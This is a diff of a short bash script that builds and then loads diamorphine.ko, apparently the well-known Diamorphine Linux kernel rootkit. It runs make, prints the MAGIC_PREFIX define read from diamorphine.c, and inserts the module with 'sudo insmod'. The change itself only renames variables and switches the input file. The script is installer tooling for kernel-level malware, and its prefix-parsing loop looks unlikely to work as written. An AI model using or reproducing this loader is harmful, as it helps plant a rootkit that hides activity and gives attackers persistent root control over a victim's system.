@@ -1,14 +1,15 @@
 #!/bin/bash
 make
-KO=diamorphine.ko
-if test -f "$KO"; then #testing if .ko was built properly
+koFile=diamorphine.ko
+cFile=diamorphine.c
+if test -f "$koFile"; then #testing if .ko was built properly
     
     while IFS=: read -r c1 c2; do
         [[ $c1 == "#define MAGIC_PREFIX" ]] && var=$c1
         [[ $c1 == INFO ]] && echo "$var$c2"
-    done < file.txt
+    done < "$cFile"
 
-    sudo insmod "$KO"
+    sudo insmod "$koFile"
     echo "built."
 
 fi
